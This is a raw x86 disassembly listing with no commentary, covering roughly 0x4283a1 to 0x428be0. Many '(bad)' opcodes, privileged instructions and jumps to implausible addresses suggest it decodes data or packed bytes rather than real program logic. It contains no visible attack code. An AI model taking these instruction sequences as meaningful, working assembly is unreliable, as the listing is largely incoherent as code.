  4283a1:	mov    esp,DWORD PTR [esi-0x4]
  4283a4:	inc    ebp
  4283a5:	cmp    BYTE PTR [eax+0x4701],0x38
  4283ac:	mov    DWORD PTR [ecx-0x7e],esp
  4283af:	add    BYTE PTR [edi-0x73],al
  4283b2:	push   0xffffffd1
  4283b4:	mov    WORD PTR [ebp+0x64],ax
  4283b8:	(bad)  
  4283b9:	call   eax
  4283bb:	mov    esp,eax
  4283bd:	data16 icebp 
  4283bf:	test   DWORD PTR [ebp-0x1],eax
  4283c2:	(bad)  
  4283c4:	out    0xc0,eax
  4283c6:	lea    esp,[esi-0x30]
  4283c9:	test   DWORD PTR [edx+0x43ff80ff],ecx
  4283cf:	inc    edi
  4283d0:	jmp    0x75ff:0x40858866
  4283d7:	dec    DWORD PTR [ebp-0x7a992f40]
  4283dd:	test   esi,edi
  4283df:	(bad)  
  4283e0:	(bad)  
  4283e1:	inc    DWORD PTR [ebp-0x9901b9]
  4283e7:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  4283ed:	rcl    BYTE PTR [ecx+0x66],0x33
  4283f1:	test   DWORD PTR [ebx+0xff72ff],edi
  4283f7:	inc    edi
  4283f8:	ret    
  4283f9:	mov    ax,WORD PTR [ebp-0x3f0004]
  428400:	push   eax
  428401:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428408:	add    BYTE PTR [ebx-0x764ff439],al
  42840e:	push   DWORD PTR [esi+0x1]
  428411:	inc    DWORD PTR [eax]
  428413:	mov    eax,0xff99ff
  428418:	or     BYTE PTR [ecx-0x7a87bb],cl
  42841e:	jne    0x4283d8
  428420:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42842a:	mov    ecx,0xd74fb8
  42842f:	add    cl,al
  428431:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428437:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42843e:	(bad)  
  42843f:	push   ebp
  428441:	mov    eax,0x8c2789
  428446:	ret    0x6689
  428449:	adc    BYTE PTR [ebp+0x4c],0x8d
  42844d:	add    bl,bl
  42844f:	mov    WORD PTR [ebp-0x70],ax
  428453:	(bad)  
  428454:	ret    0x660d
  428457:	or     BYTE PTR [ebp-0x77],dl
  42845a:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428461:	in     al,0x89
  428463:	(bad)  
  428464:	xchg   esi,eax
  428465:	aam    0xcf
  428467:	call   0x45dafcf5
  42846c:	dec    edx
  42846d:	pop    ecx
  42846e:	mov    edx,DWORD PTR [eax]
  428470:	repnz push bp
  428473:	or     BYTE PTR [ebx+0x5510663b],0x49
  42847a:	(bad)  
  42847b:	repnz xor eax,0xa0898945
  428481:	mov    ah,0x89
  428483:	jmp    DWORD PTR [edx+0x66b0418d]
  428489:	inc    DWORD PTR [ebp+0x50]
  42848c:	add    DWORD PTR [ebp-0x5],0xffffffbe
  428490:	mov    DWORD PTR [eax],ecx
  428492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428493:	pop    es
  428494:	inc    ecx
  428495:	(bad)  
  428496:	cbw    
  428498:	inc    ebp
  428499:	xor    ah,BYTE PTR [esi+0x3]
  42849c:	dec    ebp
  42849d:	push   eax
  42849e:	inc    bp
  4284a0:	jge    0x428425
  4284a2:	mov    esp,DWORD PTR [esi-0x18]
  4284a5:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4284ab:	add    DWORD PTR [ebx],esi
  4284ad:	add    BYTE PTR [ebx],al
  4284af:	test   DWORD PTR [ebx],esi
  4284b1:	(bad)  
  4284b2:	inc    WORD PTR [ebp+0x0]
  4284b6:	mov    eax,DWORD PTR [eax]
  4284b8:	call   0x88983bed
  4284bd:	mov    esi,eax
  4284bf:	clc    
  4284c0:	ret    
  4284c1:	rol    cl,0xa
  4284c4:	mov    DWORD PTR ds:0x7c0ec88,esi
  4284ca:	mov    edx,edi
  4284cc:	pushf  
  4284cd:	pop    es
  4284ce:	jmp    FWORD PTR [edx+0x66]
  4284d1:	add    BYTE PTR [ebp-0x990175],al
  4284d7:	inc    ebp
  4284d8:	test   DWORD PTR [ebx-0x2f000202],eax
  4284de:	push   ebp
  4284df:	mov    edi,eax
  4284e1:	mov    dh,BYTE PTR [eax+0x266ff51]
  4284e7:	push   ebp
  4284e8:	add    BYTE PTR [ebx-0x764b1777],al
  4284ee:	dec    DWORD PTR [esi+0x661851e8]
  4284f4:	add    BYTE PTR [ebp-0x7b],dl
  4284f7:	cmp    esi,0xfffffffb
  4284fa:	dec    DWORD PTR [ecx+0x51fe9285]
  428500:	jmp    DWORD PTR [esi-0x75]
  428503:	push   ebp
  428504:	hlt    
  428505:	data16 (bad) 
  428507:	dec    ebp
  428508:	ret    
  428509:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42850f:	lea    edx,[eax-0x1]
  428512:	jne    0x4284e5
  428514:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42851a:	dec    BYTE PTR [ecx+0x51559eff]
  428520:	mov    DWORD PTR [esi-0x4c],esp
  428523:	push   ebp
  428524:	jmp    DWORD PTR [esi-0x18]
  428527:	inc    ebp
  428528:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42852e:	(bad)  
  42852f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428530:	inc    eax
  428532:	test   DWORD PTR [esi-0x2],esp
  428535:	inc    ebp
  428536:	dec    DWORD PTR [ebp-0x760bde75]
  42853c:	(bad)  
  42853d:	test   al,0xc3
  42853f:	mov    DWORD PTR [ebp-0x769b56],ecx
  428545:	lods   al,BYTE PTR ds:[esi]
  428546:	push   eax
  428547:	inc    ebp
  428548:	jne    0x428559
  42854a:	dec    DWORD PTR [ebp+0x8]
  42854d:	mov    eax,DWORD PTR [edi]
  42854f:	sbb    al,0x0
  428551:	(bad)  
  428552:	mov    eax,0xc14fc3
  428557:	mov    DWORD PTR [eax-0x64],edi
  42855a:	inc    bp
  42855c:	test   DWORD PTR [edi],ecx
  42855e:	dec    DWORD PTR [ebp-0x1]
  428561:	xor    eax,edi
  428563:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428569:	inc    ebp
  42856a:	xor    DWORD PTR [ebx],0x3f
  42856d:	mov    WORD PTR [ebp-0x1bc],ax
  428574:	lea    ecx,[ecx-0x767702]
  42857a:	inc    esi
  42857b:	(bad)  
  42857c:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  428583:	pushf  
  428584:	rol    DWORD PTR [ebp-0x72019a],0xff
  42858b:	add    bh,bh
  42858d:	add    BYTE PTR [edi],cl
  42858f:	test   DWORD PTR [eax],eax
  428591:	(bad)  
  428592:	dec    WORD PTR [ebp-0xff002d]
  428599:	mov    DWORD PTR [eax+edi*4+0x0],edi
  42859d:	jmp    DWORD PTR [esi-0x73]
  4285a0:	lea    esi,[eax+0x50ffffff]
  4285a6:	fadd   QWORD PTR [ebp+0x0]
  4285a9:	xor    esp,DWORD PTR [esi+0x3]
  4285ac:	lea    edx,[eax-0x1]
  4285af:	test   edi,edi
  4285b1:	dec    DWORD PTR [ebp-0x1]
  4285b4:	mov    edi,edi
  4285b6:	dec    eax
  4285b7:	clc    
  4285b8:	call   DWORD PTR [ebp-0x73]
  4285bb:	lea    esi,[eax+0x51ffff88]
  4285c1:	lea    ecx,[ebp-0x78]
  4285c4:	test   WORD PTR [ebp-0x2],ax
  4285cb:	popf   
  4285cc:	push   eax
  4285cd:	add    BYTE PTR [ecx-0x77],dl
  4285d0:	xor    edi,DWORD PTR [eax-0x7236007d]
  4285d6:	cwde   
  4285d7:	mov    al,0x32
  4285d9:	inc    DWORD PTR [ebx]
  4285db:	push   eax
  4285dc:	push   ecx
  4285dd:	inc    ebp
  4285de:	shl    BYTE PTR [ebx],1
  4285e0:	lea    eax,[ebx]
  4285e2:	call   DWORD PTR [eax-0x1]
  4285e5:	test   DWORD PTR [ebx],esi
  4285e7:	inc    DWORD PTR [eax-0x1]
  4285ea:	(bad)  
  4285eb:	(bad)  
  4285ec:	(bad)  
  4285ed:	clc    
  4285ee:	call   DWORD PTR [ebp+0x50]
  4285f1:	jmp    0xcb876b
  4285f6:	inc    esp
  4285f7:	jnp    0x4285f8
  4285f9:	add    BYTE PTR [ecx-0x484f73],cl
  4285ff:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428605:	mov    eax,DWORD PTR [ecx]
  428607:	data16 add BYTE PTR [ebp-0xb50077],al
  42860e:	inc    eax
  428610:	lea    esp,[esi+0x14]
  428613:	test   DWORD PTR [ecx-0xb301],ecx
  428619:	inc    edi
  42861a:	(bad)  
  42861b:	dec    si
  42861d:	test   edi,edi
  42861f:	(bad)  
  428620:	cmp    eax,0xc74f73ff
  428625:	mov    edx,DWORD PTR [edx-0x7d]
  428628:	push   DWORD PTR [ebx+0x56328939]
  42862e:	(bad)  
  42862f:	call   FWORD PTR [esi-0x47]
  428632:	inc    DWORD PTR ds:0x893c00ea
  428638:	(bad)  
  428639:	pop    eax
  42863a:	mov    ah,0xff
  42863c:	(bad)  
  42863d:	mov    ecx,0x5745
  428642:	dec    DWORD PTR [ecx-0xf7a501]
  428648:	(bad)  
  428649:	mov    ecx,0x456108
  42864e:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428654:	test   BYTE PTR [ebp-0x72ff23fd],cl
  42865a:	inc    BYTE PTR gs:[eax]
  42865d:	inc    DWORD PTR [ebp-0x73]
  428660:	cmp    dh,bh
  428662:	pushf  
  428663:	inc    edi
  428665:	mov    ebx,eax
  428667:	hlt    
  428668:	test   DWORD PTR [ecx-0xbab708],ecx
  42866e:	cmp    al,0xbe
  428670:	pushf  
  428671:	or     bh,al
  428673:	pop    es
  428674:	lock into 
  428676:	test   eax,eax
  428678:	clc    
  428679:	mov    ebx,0x387245
  42867e:	lahf   
  42867f:	retf   
  428680:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  428686:	add    edi,edi
  428688:	add    BYTE PTR [ecx+0x45],dl
  42868b:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  428692:	mov    edx,DWORD PTR [ecx-0x74]
  428695:	inc    DWORD PTR [eax]
  428697:	cld    
  428698:	mov    eax,DWORD PTR [ebp-0x6f0175]
  42869e:	add    BYTE PTR [ebp-0x1b0177],al
  4286a4:	jge    0x4286eb
  4286a6:	test   DWORD PTR [ebx+0xff9875],ecx
  4286ac:	sbb    BYTE PTR [esi+0x55],ah
  4286af:	xchg   ebp,eax
  4286b0:	call   0x4281b4
  4286b5:	push   edi
  4286b6:	inc    ebp
  4286b7:	mov    dx,WORD PTR [ebp-0xfc0075]
  4286be:	cmp    al,0x85
  4286c0:	ud0    eax,DWORD PTR [ebp-0x1]
  4286c4:	test   DWORD PTR [edi+0x74],ecx
  4286c7:	dec    edi
  4286c8:	inc    DWORD PTR [ebp-0xf70004]
  4286ce:	dec    DWORD PTR [edi-0x75]
  4286d1:	dec    edi
  4286d2:	cld    
  4286d3:	test   DWORD PTR [eax+0xff01ff],eax
  4286d9:	icebp  
  4286da:	add    BYTE PTR [edi-0x3a],cl
  4286dd:	test   ebx,eax
  4286df:	inc    BYTE PTR [ebp-0x1]
  4286e2:	jne    0x4286e4
  4286e4:	mov    eax,DWORD PTR [eax]
  4286e6:	cld    
  4286e7:	xor    BYTE PTR [ecx+0x500155],cl
  4286ed:	push   ebp
  4286ee:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4286f4:	add    BYTE PTR [ebp+0x35e90f50],al
  4286fa:	add    al,BYTE PTR [eax]
  4286fc:	add    BYTE PTR [ebx-0x38fe4f80],al
  428702:	add    ah,ch
  428704:	or     BYTE PTR [ebp+0x4501f845],dh
  42870a:	jmp    0xde8a07
  42870f:	(bad)  
  428710:	nop    ecx
  428713:	test   DWORD PTR [ebp+0x4502f8],eax
  428719:	cmp    cl,BYTE PTR [ebp-0x64]
  42871c:	mov    eax,edi
  42871e:	mov    ebx,DWORD PTR [eax+edx*2]
  428721:	add    eax,0x45fef885
  428726:	dec    DWORD PTR [ebx+0x339445]
  42872c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428732:	dec    DWORD PTR [ebx-0x460f0375]
  428738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428739:	add    esi,edi
  42873b:	add    bh,bh
  42873d:	rdpmc  
  42873f:	add    BYTE PTR [ebx],0x1
  428742:	mov    DWORD PTR [eax],eax
  428744:	add    al,0x45
  428746:	dec    DWORD PTR [ecx-0x360b3373]
  42874c:	dec    DWORD PTR [esi]
  42874e:	push   eax
  42874f:	jne    0x428796
  428751:	mov    esi,DWORD PTR [ebx]
  428753:	cld    
  428754:	add    ebp,ebx
  428756:	push   eax
  428757:	inc    DWORD PTR [ebp-0x75]
  42875a:	add    eax,0x800e4
  42875f:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428765:	mov    DWORD PTR [ecx],eax
  428767:	sbb    al,0x0
  428769:	leave  
  42876a:	test   DWORD PTR [edi-0x2],eax
  42876d:	jne    0x42876e
  42876f:	call   0xff437274
  428774:	xor    BYTE PTR [ebp+0x4d],al
  428777:	mov    edi,edi
  428779:	enter  0x8,0x4d
  42877d:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  428783:	mov    eax,DWORD PTR [eax]
  428785:	cld    
  428786:	add    DWORD PTR [ecx],ebx
  428788:	inc    ebp
  428789:	dec    ebp
  42878a:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  428790:	inc    eax
  428791:	dec    DWORD PTR [ecx-0x270375]
  428797:	add    BYTE PTR [ebx-0x39d72701],cl
  42879d:	xchg   ecx,eax
  42879e:	ret    
  42879f:	add    BYTE PTR [ebp-0x830075],al
  4287a5:	add    BYTE PTR [ebp-0x75],al
  4287a8:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4287ae:	lea    edi,[edi-0xc]
  4287b1:	add    bh,bh
  4287b3:	mov    edx,DWORD PTR [eax-0x7b]
  4287b6:	inc    ebp
  4287b7:	rdpmc  
  4287b9:	jne    0x4287be
  4287bb:	add    BYTE PTR [eax-0x75],dl
  4287be:	inc    ebp
  4287bf:	clc    
  4287c0:	add    eax,0x400009
  4287c5:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4287cb:	mov    eax,DWORD PTR [ecx]
  4287cd:	in     al,dx
  4287ce:	add    dh,al
  4287d0:	test   ebx,eax
  4287d2:	inc    BYTE PTR [ebp-0xff0001]
  4287d8:	add    BYTE PTR [ebp-0x43],al
  4287db:	cmp    esi,0xfffffff8
  4287de:	(bad)  
  4287df:	push   DWORD PTR [eax]
  4287e1:	add    BYTE PTR [ebp-0x3a],dl
  4287e4:	test   ebx,eax
  4287e6:	je     0x42876d
  4287e8:	mov    edi,edi
  4287ea:	sbb    al,0xff
  4287ec:	test   DWORD PTR gs:[eax],eax
  4287ef:	(bad)  
  4287f0:	js     0x4287f1
  4287f2:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4287f8:	sub    eax,ebx
  4287fa:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428800:	add    eax,DWORD PTR [eax]
  428802:	dec    ebp
  428803:	push   eax
  428804:	mov    al,BYTE PTR [ebp+0x1]
  428807:	mov    eax,DWORD PTR [ebp-0x68]
  42880a:	mov    eax,DWORD PTR [eax]
  42880c:	sbb    bh,al
  42880e:	or     ah,dh
  428810:	dec    ebp
  428811:	inc    DWORD PTR [eax+0x4]
  428814:	push   ecx
  428815:	add    BYTE PTR [edx-0x1],dh
  428818:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42881e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428828:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42882e:	push   ecx
  42882f:	cmp    BYTE PTR [ebx],al
  428831:	inc    ebp
  428832:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428838:	(bad)  
  428839:	(bad)  
  42883a:	in     al,0xff
  42883c:	add    BYTE PTR [ebp+0x0],al
  42883f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428845:	add    al,bh
  428847:	(bad)  
  428848:	jmp    0x8d85:0x74b0558d
  42884f:	dec    DWORD PTR [eax]
  428851:	call   DWORD PTR [ebp-0x7b]
  428854:	mov    edi,esi
  428856:	lock call DWORD PTR [ebp-0x75]
  42885a:	mov    esi,esp
  42885c:	mov    ah,0xc6
  42885e:	mov    bh,0xc3
  428860:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428866:	add    DWORD PTR [eax],0x450050ff
  42886c:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428872:	inc    edi
  428874:	push   esp
  428876:	jmp    0xcd00:0x680481ff
  42887d:	mov    DWORD PTR [ebx],esi
  42887f:	clc    
  428880:	cmp    edi,0xff9cff3b
  428886:	jne    0x428890
  428888:	mov    eax,eax
  42888a:	add    esi,DWORD PTR [eax]
  42888c:	int3   
  42888d:	inc    ebp
  42888e:	cmp    al,0x83
  428890:	add    BYTE PTR [eax],bl
  428892:	adc    DWORD PTR [ebx+0x768b5055],eax
  428898:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  42889e:	mov    edi,eax
  4288a0:	cmp    BYTE PTR [ebp+0x45],cl
  4288a3:	jmp    0x428830
  4288a5:	mov    ebx,DWORD PTR [esp+ebp*8]
  4288a8:	inc    ebp
  4288a9:	or     al,0x2
  4288ab:	dec    DWORD PTR [ebp+0x18]
  4288ae:	jne    0x428905
  4288b0:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4288b6:	mov    edi,DWORD PTR [ebx]
  4288b8:	in     al,0x50
  4288ba:	xchg   ecx,eax
  4288bb:	jmp    0x342d7c0
  4288c0:	adc    al,0x8b
  4288c2:	inc    ebp
  4288c3:	mov    al,ds:0x8b04008b
  4288c8:	push   ebp
  4288c9:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4288cf:	push   ebp
  4288d0:	test   DWORD PTR [ebx-0x2800d701],ecx
  4288d6:	inc    ebp
  4288d7:	dec    ebp
  4288d8:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4288de:	mov    DWORD PTR [eax],0xe9ff00f4
  4288e4:	add    al,0x0
  4288e6:	add    BYTE PTR [eax],al
  4288e8:	mov    eax,edx
  4288ea:	push   eax
  4288eb:	rol    DWORD PTR [ebp-0xf0177],1
  4288f1:	bound  eax,QWORD PTR [ebp+0x50]
  4288f4:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4288fa:	add    BYTE PTR [ecx+0x558df0ff],cl
  428900:	mov    al,0xf
  428902:	test   DWORD PTR [edx],edx
  428904:	call   DWORD PTR [ebp-0x7a0001]
  42890a:	(bad)  
  42890b:	loop   0x42890c
  42890d:	jnp    0xc6987d13
  428913:	mov    eax,ebx
  428915:	cmp    al,0x8b
  428917:	(bad)  
  428918:	cld    
  428919:	shr    esi,0xc
  42891c:	add    dl,al
  42891e:	push   eax
  42891f:	lea    eax,[ebp-0x1]
  428922:	mov    edx,esi
  428924:	cwde   
  428925:	cli    
  428926:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42892c:	or     BYTE PTR [eax],cl
  42892e:	inc    ebp
  42892f:	dec    ebp
  428930:	inc    DWORD PTR [ebx+0x74803914]
  428936:	add    DWORD PTR [ebx+0x451800],ecx
  42893c:	call   DWORD PTR [eax+edx*1]
  42893f:	add    ecx,DWORD PTR [ebp-0x34]
  428942:	push   edi
  428943:	adc    al,0x8
  428945:	mov    edx,DWORD PTR [ebp-0x14]
  428948:	mov    ecx,DWORD PTR [ebp+0x18]
  42894b:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  42894f:	inc    DWORD PTR [eax+esi*8]
  428952:	inc    ebp
  428953:	stos   BYTE PTR es:[edi],al
  428954:	mov    edx,DWORD PTR [ebp-0x4]
  428957:	add    DWORD PTR [ebp-0x1c],eax
  42895a:	mov    edx,DWORD PTR [ebp-0x70]
  42895d:	cmp    eax,DWORD PTR [eax]
  42895f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428960:	mov    eax,DWORD PTR [eax]
  428962:	cld    
  428963:	jae    0x4288e5
  428965:	add    eax,DWORD PTR [ecx]
  428967:	clc    
  428968:	add    BYTE PTR [eax+0x30],dl
  42896b:	mov    DWORD PTR [ecx],esi
  42896d:	clc    
  42896e:	pop    ds
  42896f:	inc    ebp
  428970:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428976:	(bad)  
  428977:	push   DWORD PTR [edi]
  428979:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  42897f:	(bad)  
  428980:	jae    0x428981
  428982:	mov    eax,DWORD PTR [ebp-0x740175]
  428988:	sub    eax,DWORD PTR [eax]
  42898a:	add    eax,DWORD PTR [eax]
  42898c:	mov    DWORD PTR [ecx+0x5f],eax
  42898f:	mov    DWORD PTR [ebx-0x4],ebx
  428992:	ret    0xff
  428995:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  42899b:	ret    
  42899c:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4289a2:	add    BYTE PTR [ebp-0x7d],al
  4289a5:	mov    DWORD PTR [eax],eax
  4289a7:	add    al,0x84
  4289a9:	inc    DWORD PTR [ecx]
  4289ab:	lea    eax,[eax]
  4289ad:	hlt    
  4289ae:	sar    bh,cl
  4289b0:	test   BYTE PTR [eax+0x1],dl
  4289b3:	inc    ebp
  4289b4:	add    BYTE PTR [ebx],dh
  4289b6:	test   BYTE PTR [ebx],0x84
  4289b9:	push   eax
  4289ba:	add    BYTE PTR [ebp+0x0],al
  4289bd:	add    eax,0x86
  4289c2:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4289c8:	add    BYTE PTR [ecx],al
  4289ca:	add    BYTE PTR [eax],al
  4289cc:	mov    esi,0x550030
  4289d1:	mov    ecx,DWORD PTR [edi]
  4289d3:	cld    
  4289d4:	fidiv  DWORD PTR [ebp+0x0]
  4289d7:	mov    edi,DWORD PTR [ecx]
  4289d9:	xor    BYTE PTR [eax+eax*1],0x84
  4289dd:	add    eax,DWORD PTR [eax]
  4289df:	sbb    BYTE PTR [eax],al
  4289e1:	jne    0x428994
  4289e3:	mov    eax,DWORD PTR [ecx]
  4289e5:	sbb    BYTE PTR [eax],al
  4289e7:	mov    DWORD PTR [ebp-0x1],esp
  4289ea:	add    BYTE PTR [eax+0x30e45ca],bh
  4289f0:	ret    0xb7fc
  4289f3:	dec    ebp
  4289f4:	or     al,0x89
  4289f6:	dec    ebp
  4289f7:	cld    
  4289f8:	cmovne ecx,DWORD PTR [eax-0x75]
  4289fc:	add    edi,esp
  4289fe:	seto   BYTE PTR [esi-0x72ffffff]
  428a05:	inc    ebp
  428a06:	adc    al,0x8b
  428a08:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428a0f:	cmp    DWORD PTR [edi+0x72],edx
  428a12:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428a18:	gs cmp al,0x0
  428a1b:	je     0x4289f3
  428a1d:	push   eax
  428a1e:	sar    BYTE PTR [eax],1
  428a20:	mov    bh,0x3e
  428a22:	push   cs
  428a23:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428a29:	add    DWORD PTR [ecx+0x12],ebp
  428a2c:	dec    edx
  428a2d:	(bad)  
  428a2e:	mov    eax,edx
  428a30:	in     al,dx
  428a31:	adc    DWORD PTR [ecx],esi
  428a33:	pop    esi
  428a34:	inc    ecx
  428a35:	leave  
  428a36:	or     DWORD PTR [eax],ebx
  428a38:	gs push ebp
  428a3a:	add    ah,ch
  428a3c:	into   
  428a3d:	in     al,dx
  428a3e:	enter  0xb756,0xf0
  428a42:	push   cs
  428a43:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428a4d:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428a53:	jnp    0x74430f5b
  428a59:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  428a5f:	add    BYTE PTR [edi],cl
  428a61:	mov    edi,DWORD PTR [ecx-0x78]
  428a64:	ltr    WORD PTR [ecx-0x7b]
  428a68:	dec    DWORD PTR [edi]
  428a6a:	clc    
  428a6b:	out    0x45,eax
  428a6d:	add    BYTE PTR [eax],cl
  428a6f:	cmp    ebx,0xffffff8c
  428a72:	jge    0x428a74
  428a74:	jb     0x428a86
  428a76:	je     0x518af6
  428a7c:	pop    edx
  428a7d:	push   esi
  428a7e:	mov    ecx,DWORD PTR [edi]
  428a80:	in     al,dx
  428a81:	rol    DWORD PTR [ebp+0x0],1
  428a84:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428a8b:	cmp    DWORD PTR [ecx],0xfffffff0
  428a8e:	hlt    
  428a8f:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428a95:	(bad)  
  428a97:	push   eax
  428a98:	jns    0xb8426f16
  428a9e:	lock push cs
  428aa0:	ror    edx,0x3
  428aa3:	test   BYTE PTR [ecx+0x5500e800],cl
  428aa9:	dec    eax
  428aaa:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428aae:	(bad)  
  428aaf:	mov    esi,0x7f33ff5f
  428ab4:	inc    eax
  428ab5:	test   DWORD PTR [edx],eax
  428ab7:	je     0x428a79
  428ab9:	mov    ecx,ecx
  428abb:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428abf:	and    eax,DWORD PTR [eax+0xf0103]
  428ac5:	jp     0x428ab3
  428ac7:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  428acb:	add    edx,DWORD PTR [edi+0x74]
  428ace:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428ad4:	add    BYTE PTR [ebp-0x74c48bbb],al
  428ada:	je     0x428a5f
  428adc:	cmp    eax,edi
  428ade:	js     0x428b03
  428ae0:	add    eax,0xeb0fc003
  428ae5:	jns    0x428a72
  428ae7:	vmread DWORD PTR [ecx+0x45],ebx
  428aeb:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428af1:	adc    al,0x8b
  428af3:	jge    0x428b09
  428af5:	mov    edi,DWORD PTR [eax-0x4]
  428af8:	add    edi,DWORD PTR [edi]
  428afa:	or     bh,bh
  428afc:	push   ebp
  428afd:	push   es
  428afe:	mov    DWORD PTR [ebp-0x4],ebx
  428b01:	add    edi,esi
  428b03:	pop    es
  428b04:	add    esi,DWORD PTR [edi-0x48ccf183]
  428b0a:	mov    DWORD PTR [esp+esi*8],ecx
  428b0d:	inc    ebp
  428b0e:	pop    ebp
  428b0f:	xor    DWORD PTR [esi-0x4],0x3b
  428b13:	add    edx,DWORD PTR [ecx+edi*1]
  428b16:	push   es
  428b17:	clc    
  428b18:	mov    bh,0xdb
  428b1a:	jp     0x428ad3
  428b1c:	add    cl,BYTE PTR [esi]
  428b1e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428b24:	test   edi,edi
  428b26:	je     0x428b1c
  428b28:	mov    eax,ecx
  428b2a:	or     BYTE PTR [ebx],al
  428b2c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428b32:	jbe    0x428ba6
  428b34:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428b3a:	add    ecx,DWORD PTR [esi]
  428b3c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428b42:	add    eax,DWORD PTR [ebx-0x287af783]
  428b48:	je     0x428b97
  428b4a:	mov    DWORD PTR [ecx],edi
  428b4c:	mov    esi,eax
  428b4e:	hlt    
  428b4f:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428b56:	jb     0x428b18
  428b58:	jmp    0x428b45
  428b5a:	xor    esi,DWORD PTR [ebx]
  428b5c:	pop    edi
  428b5d:	pop    esi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	ret    0x8b
  428b63:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428b69:	cmp    DWORD PTR [eax],0xc
  428b6c:	pushf  
  428b6d:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428b73:	(bad)  
  428b75:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  428b7c:	dec    ebp
  428b7d:	ret    
  428b7e:	mov    edi,DWORD PTR [esi-0x4]
  428b81:	pop    eax
  428b82:	dec    ebp
  428b83:	jne    0x428b10
  428b85:	xor    edi,esp
  428b87:	inc    eax
  428b88:	dec    ebp
  428b89:	jbe    0x428bde
  428b8b:	inc    eax
  428b8c:	pop    ebp
  428b8d:	add    edx,DWORD PTR [esi+0x8]
  428b90:	push   eax
  428b91:	dec    eax
  428b92:	push   ecx
  428b93:	mov    eax,edi
  428b95:	and    al,0xf0
  428b97:	jo     0x428b84
  428b99:	mov    eax,DWORD PTR [ebx]
  428b9b:	sbb    BYTE PTR [ebp+0x4d],cl
  428b9e:	mov    eax,DWORD PTR [ebx]
  428ba0:	nop
  428ba1:	or     BYTE PTR [eax],al
  428ba3:	jne    0x428bfc
  428ba5:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428bab:	cld    
  428bac:	xor    edi,edi
  428bae:	add    edi,DWORD PTR [ebp+0x3]
  428bb1:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428bb7:	js     0x428b3d
  428bb9:	jae    0x428bbd
  428bbb:	(bad)  
  428bbd:	xor    al,0x5d
  428bbf:	jmp    0x428b4c
  428bc1:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428bc8:	fdecstp 
  428bca:	test   BYTE PTR [edi],ah
  428bcc:	add    bh,BYTE PTR [ebp+0x0]
  428bcf:	add    ebx,DWORD PTR [ebp-0x77]
  428bd2:	mov    edi,eax
  428bd4:	cmp    al,0x0
  428bd7:	adc    dh,BYTE PTR [ebx]
  428bd9:	jge    0x428bde
  428bdb:	mov    edi,DWORD PTR [ebx]
  428bdd:	jl     0x428bee
  428bdf:	clc    
  428be0:	dec    edi
